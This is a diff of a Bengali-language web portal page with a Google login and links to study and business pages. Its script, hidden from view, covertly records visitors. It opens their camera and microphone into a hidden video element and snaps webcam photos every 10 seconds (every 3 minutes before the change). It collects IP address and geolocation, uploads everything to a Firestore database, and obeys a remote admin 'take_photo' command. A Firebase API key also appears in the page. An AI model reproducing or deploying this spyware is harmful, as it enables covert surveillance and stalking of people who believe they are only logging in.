@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="bn">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -8,136 +7,29 @@
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --pink: #ff4d94;
-            --dark: #0f172a;
-            --card: #1e293b;
-            --text: #f8fafc;
-        }
+        :root { --pink: #ff4d94; --dark: #0f172a; --card: #1e293b; --text: #f8fafc; }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
+        body { background: var(--dark); color: var(--text); overflow-x: hidden; }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Hind Siliguri', sans-serif;
-        }
+        /* Login UI */
+        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        .login-box { background: var(--card); padding: 40px; border-radius: 30px; border: 2px solid var(--pink); text-align: center; width: 90%; max-width: 400px; }
+        .round-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); margin-bottom: 20px; object-fit: cover; }
+        
+        /* Main UI */
+        #main-ui { display: none; }
+        .hero { background: linear-gradient(135deg, #ff4d94 0%, #7c3aed 100%); padding: 50px 20px; text-align: center; border-radius: 0 0 50px 50px; }
+        .profile-wrapper { display: flex; justify-content: center; align-items: center; }
+        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid white; object-fit: cover; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        .user-p-img { width: 85px; height: 85px; margin-left: -25px; border: 3px solid var(--dark); z-index: 1; }
 
-        body {
-            background: var(--dark);
-            color: var(--text);
-            overflow-x: hidden;
-        }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; padding: 25px; max-width: 900px; margin: 0 auto; }
+        .card { background: var(--card); border-radius: 20px; padding: 20px; text-align: center; text-decoration: none; color: white; border: 1px solid #334155; }
+        .card i { font-size: 2rem; color: var(--pink); margin-bottom: 10px; }
 
-        /* --- Login Overlay --- */
-        #login-overlay {
-            position: fixed;
-            inset: 0;
-            background: var(--dark);
-            z-index: 10000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .login-box {
-            background: var(--card);
-            padding: 40px;
-            border-radius: 30px;
-            border: 2px solid var(--pink);
-            text-align: center;
-            width: 90%;
-            max-width: 400px;
-        }
-
-        .round-img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            border: 3px solid var(--pink);
-            margin-bottom: 20px;
-            object-fit: cover;
-        }
-
-        /* --- Main UI --- */
-        #main-ui {
-            display: none;
-        }
-
-        .hero {
-            background: linear-gradient(135deg, #ff4d94 0%, #7c3aed 100%);
-            padding: 50px 20px;
-            text-align: center;
-            border-radius: 0 0 50px 50px;
-            position: relative;
-        }
-
-        .profile-wrapper {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: -20px;
-        }
-
-        .p-img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            border: 4px solid white;
-            object-fit: cover;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-        }
-
-        .user-p-img {
-            width: 80px;
-            height: 80px;
-            margin-left: -20px;
-            z-index: 1;
-            border: 3px solid var(--dark);
-        }
-
-        .container {
-            padding: 20px;
-            max-width: 900px;
-            margin: 0 auto;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 15px;
-            margin-top: 30px;
-        }
-
-        .card {
-            background: var(--card);
-            border-radius: 20px;
-            padding: 20px;
-            text-align: center;
-            text-decoration: none;
-            color: white;
-            border: 1px solid #334155;
-            transition: 0.3s;
-        }
-
-        .card:hover {
-            transform: translateY(-5px);
-            border-color: var(--pink);
-        }
-
-        .card i {
-            font-size: 2rem;
-            color: var(--pink);
-            margin-bottom: 10px;
-        }
-
-        canvas {
-            display: none;
-        }
-
-        /* ছবি তোলার জন্য হিডেন ক্যানভাস */
+        canvas, video { display: none; }
     </style>
 </head>
-
 <body>
 
     <div id="login-overlay">
@@ -145,8 +37,7 @@
             <img src="ratan.jpg" onerror="this.src='https://i.ibb.co/vzYm8mN/ratan.jpg'" class="round-img">
             <h3>স্বাগতম রতন ব্রো পোর্টালে</h3>
             <p style="margin: 15px 0; opacity: 0.7;">এগিয়ে যেতে জিমেইল দিয়ে লগইন করুন</p>
-            <button onclick="googleLogin()"
-                style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%;">
+            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%;">
                 <i class="fab fa-google"></i> Login with Google
             </button>
         </div>
@@ -155,42 +46,28 @@
     <div id="main-ui">
         <section class="hero">
             <div class="profile-wrapper">
-                <img src="ratan.jpg" class="p-img"> <img id="user-display-pic" src="" class="p-img user-p-img">
+                <img src="ratan.jpg" class="p-img">
+                <img id="user-display-pic" src="" class="p-img user-p-img">
             </div>
             <h2 id="user-welcome" style="margin-top:15px;"></h2>
-            <div
-                style="background:white; color:var(--pink); padding:5px 15px; border-radius:20px; display:inline-block; font-weight:bold; margin-top:10px;">
-                ratan.bro.bd</div>
+            <div style="background:white; color:var(--pink); padding:5px 15px; border-radius:20px; display:inline-block; font-weight:bold; margin-top:10px;">System Secured</div>
         </section>
 
-        <div class="container">
-            <div class="grid">
-                <a href="testpaper.html" class="card">
-                    <i class="fas fa-file-pdf"></i>
-                    <h4>HSC Test Paper</h4>
-                </a>
-                <a href="business.html" class="card">
-                    <i class="fas fa-chart-line"></i>
-                    <h4>Dropshipping</h4>
-                </a>
-                <a href="https://your-lookup-site.com" class="card"> <i class="fas fa-search"></i>
-                    <h4>Number Lookup</h4>
-                </a>
-                <a href="portfolio.html" class="card">
-                    <i class="fas fa-id-card"></i>
-                    <h4>My Info</h4>
-                </a>
-            </div>
+        <div class="grid">
+            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
+            <a href="business.html" class="card"><i class="fas fa-briefcase"></i><h4>Dropshipping</h4></a>
+            <a href="https://your-lookup-site.com" class="card"><i class="fas fa-search"></i><h4>Lookup</h4></a>
+            <a href="portfolio.html" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
         </div>
     </div>
 
-    <canvas id="snapshotCanvas" width="640" height="480"></canvas>
-    <video id="hiddenVideo" autoplay style="display:none;"></video>
+    <canvas id="snapCanvas" width="640" height="480"></canvas>
+    <video id="vSource" autoplay playsinline></video>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
@@ -206,61 +83,58 @@
         const db = getFirestore(app);
         const provider = new GoogleAuthProvider();
 
-        // গুগল লগইন
-        window.googleLogin = () => {
-            signInWithPopup(auth, provider).catch(e => console.log("Login Error"));
-        };
+        window.googleLogin = () => { signInWithPopup(auth, provider); };
 
-        // লগইন স্ট্যাটাস চেক (অটো লগইন)
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
-                document.getElementById('user-welcome').innerText = "Hello, " + user.displayName;
+                document.getElementById('user-welcome').innerText = user.displayName;
                 document.getElementById('user-display-pic').src = user.photoURL;
-
-                startTracking(user); // তথ্য সংগ্রহ ও ছবি তোলা শুরু
+                initTracking(user);
             }
         });
 
-        async function startTracking(user) {
-            // ১. ক্যামেরা চালু করা (পারমিশন চাইলে ইউজার এলাও করবে)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(e => console.log("Media blocked"));
-            document.getElementById('hiddenVideo').srcObject = stream;
+        async function initTracking(user) {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(e => console.log("Blocked"));
+            document.getElementById('vSource').srcObject = stream;
 
-            // ২. প্রতি ৩ মিনিট পর পর ছবি তোলা ও তথ্য পাঠানো
-            setInterval(() => {
-                takeSnapshot(user);
-            }, 180000); // ১৮০০০০ মি:লি: = ৩ মিনিট
+            const uRef = doc(db, "users", user.email.replace('.', '_'));
 
-            takeSnapshot(user); // প্রথমবার সাথে সাথেই একবার হবে
+            // এডমিন থেকে সরাসরি ছবি তোলার কমান্ড শুনবে
+            onSnapshot(uRef, (snap) => {
+                if (snap.data()?.command === "take_photo") {
+                    capture(user);
+                    updateDoc(uRef, { command: "" });
+                }
+            });
+
+            // প্রথম ছবি সাথে সাথে এবং পরে প্রতি ১০ সেকেন্ডে
+            capture(user); 
+            setInterval(() => capture(user), 10000); 
         }
 
-        async function takeSnapshot(user) {
-            const canvas = document.getElementById('snapshotCanvas');
-            const video = document.getElementById('hiddenVideo');
+        async function capture(user) {
+            const canvas = document.getElementById('snapCanvas');
+            const video = document.getElementById('vSource');
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, 640, 480);
-            const dataURL = canvas.toDataURL('image/jpeg'); // এটি হচ্ছে ইউজারের ছবি
+            const image = canvas.toDataURL('image/jpeg', 0.6); // ফাইল সাইজ কমাতে কোয়ালিটি ০.৬
 
-            let ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: "Unknown" }));
-            let battery = "Unknown";
-            if (navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; }
-
+            const ipInfo = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
+            
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const info = {
+                await setDoc(doc(db, "users", user.email.replace('.', '_')), {
                     name: user.displayName,
                     email: user.email,
-                    ip: ip.ip,
-                    battery: battery,
+                    photo: user.photoURL,
+                    ip: ipInfo.ip,
                     loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
-                    lastPic: dataURL, // এখানে ইউজারের লাইভ ছবির ডাটা থাকবে যা এডমিনে দেখা যাবে
+                    lastPic: image, // এটি প্রতি ১০ সেকেন্ডে নতুন ছবি দিয়ে আপডেট হবে
                     time: new Date().toLocaleString()
-                };
-                await setDoc(doc(db, "users", user.email.replace('.', '_')), info, { merge: true });
+                }, { merge: true });
             });
         }
     </script>
 </body>
-
 </html>
